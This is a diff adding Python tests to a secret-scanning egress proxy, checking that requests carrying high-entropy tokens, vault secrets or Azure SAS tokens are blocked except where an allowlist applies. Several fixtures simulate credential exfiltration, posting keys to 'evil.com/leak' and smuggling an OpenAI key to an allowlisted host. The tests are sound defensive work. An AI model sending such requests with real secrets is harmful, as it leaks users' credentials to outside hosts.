@@ -1,10 +1,13 @@
 import base64
+import json
 import os
 import tempfile
+from pathlib import Path
 from unittest.mock import MagicMock
 
 from hermes_aegis.audit.trail import AuditTrail
 from hermes_aegis.proxy.addon import AegisAddon
+from hermes_aegis.proxy.server import ContentScanner
 
 
 class FakeFlow:
@@ -240,3 +243,154 @@ class TestRateLimitDictBounds:
 
         assert len(addon._request_timestamps) == 1
         assert "fresh-host.example.com" in addon._request_timestamps
+
+
+def _allowlist_with(*domains: str) -> Path:
+    """Create a tempfile JSON allowlist with the given domains and return its path."""
+    fd, name = tempfile.mkstemp(suffix=".json")
+    os.close(fd)
+    path = Path(name)
+    path.write_text(json.dumps(list(domains)))
+    return path
+
+
+class TestAllowlistAwareScanning:
+    """Generic entropy detection should be skipped on allowlisted hosts.
+
+    Tool providers like Tavily/Firecrawl/Exa embed a high-entropy API key
+    in request bodies. Without this gating, the entropy detector self-blocks
+    every legitimate call to those services. Vault-value matches and
+    known-pattern detectors must keep firing to catch cross-provider
+    exfiltration even on allowlisted hosts.
+    """
+
+    # 32-char base64-ish high-entropy string that the entropy detector
+    # would flag but does not match any known prefix (sk-, ghp_, etc.).
+    HIGH_ENTROPY_TOKEN = "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"
+
+    def test_entropy_blocked_on_non_allowlisted_host(self):
+        """Regression-protect: entropy still blocks on non-allowlisted hosts."""
+        allowlist = _allowlist_with("api.tavily.com")
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[],
+            allowlist_path=allowlist,
+        )
+        flow = FakeFlow(
+            "evil.com", "/leak",
+            body=f'{{"key":"{self.HIGH_ENTROPY_TOKEN}"}}'.encode(),
+        )
+
+        addon.request(flow)
+
+        # Non-allowlisted host: blocked at the allowlist gate, never reaches
+        # the scanner. Either way, the request is killed — that's the
+        # invariant we want to protect.
+        assert flow.killed
+
+    def test_entropy_skipped_on_allowlisted_host(self):
+        """Same high-entropy body to an allowlisted host is allowed through."""
+        allowlist = _allowlist_with("api.tavily.com")
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[],
+            allowlist_path=allowlist,
+        )
+        flow = FakeFlow(
+            "api.tavily.com", "/search",
+            body=f'{{"api_key":"{self.HIGH_ENTROPY_TOKEN}","query":"x"}}'.encode(),
+        )
+
+        addon.request(flow)
+
+        assert not flow.killed
+
+    def test_vault_value_still_blocked_on_allowlisted_host(self):
+        """Cross-provider exfiltration: an OpenAI vault key being sent to
+        an allowlisted Tavily endpoint must still be blocked."""
+        openai_key = "sk-openai-secret-value-not-tavilys-key"
+        allowlist = _allowlist_with("api.tavily.com")
+        addon = AegisAddon(
+            vault_secrets={"OPENAI_API_KEY": openai_key},
+            vault_values=[openai_key],
+            allowlist_path=allowlist,
+        )
+        flow = FakeFlow(
+            "api.tavily.com", "/search",
+            body=f'{{"query":"steal {openai_key}"}}'.encode(),
+        )
+
+        addon.request(flow)
+
+        assert flow.killed
+
+    def test_known_pattern_still_blocked_on_allowlisted_host(self):
+        """Hard-coded patterns (here: azure_sas_token) must still fire on
+        allowlisted hosts — only the generic entropy detector is gated."""
+        allowlist = _allowlist_with("api.tavily.com")
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[],
+            allowlist_path=allowlist,
+        )
+        # Real Azure SAS token shape: ?sv=YYYY-MM-DD...&sig=<base64>
+        sas_url = (
+            "https://example.blob.core.windows.net/container/blob"
+            "?sv=2024-01-01&sr=b&sig=abcdefABCDEF1234567890ABCDEFabcdef%2B%2F%3D"
+        )
+        flow = FakeFlow(
+            "api.tavily.com", "/search",
+            body=f'{{"url":"{sas_url}"}}'.encode(),
+        )
+
+        addon.request(flow)
+
+        assert flow.killed
+
+
+class TestContentScannerHostAllowlistedFlag:
+    """Direct unit tests for ContentScanner.scan_request(host_allowlisted=...)."""
+
+    HIGH_ENTROPY_TOKEN = "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"
+
+    def test_scan_request_blocks_entropy_when_host_not_allowlisted(self):
+        scanner = ContentScanner(vault_values=[])
+        blocked, reason = scanner.scan_request(
+            url="https://evil.com/leak",
+            body=f'{{"key":"{self.HIGH_ENTROPY_TOKEN}"}}',
+            headers={},
+            host_allowlisted=False,
+        )
+        assert blocked
+        assert reason and "high_entropy_string" in reason
+
+    def test_scan_request_skips_entropy_when_host_allowlisted(self):
+        scanner = ContentScanner(vault_values=[])
+        blocked, _ = scanner.scan_request(
+            url="https://api.tavily.com/search",
+            body=f'{{"api_key":"{self.HIGH_ENTROPY_TOKEN}"}}',
+            headers={},
+            host_allowlisted=True,
+        )
+        assert not blocked
+
+    def test_scan_request_still_blocks_vault_value_when_allowlisted(self):
+        secret = "sk-openai-secret-value-not-tavilys-key"
+        scanner = ContentScanner(vault_values=[secret])
+        blocked, _ = scanner.scan_request(
+            url="https://api.tavily.com/search",
+            body=f'{{"q":"{secret}"}}',
+            headers={},
+            host_allowlisted=True,
+        )
+        assert blocked
+
+    def test_scan_request_default_is_not_allowlisted(self):
+        """Backward compat: callers that don't pass the kwarg get full scanning."""
+        scanner = ContentScanner(vault_values=[])
+        blocked, _ = scanner.scan_request(
+            url="https://evil.com/leak",
+            body=f'{{"key":"{self.HIGH_ENTROPY_TOKEN}"}}',
+            headers={},
+        )
+        assert blocked
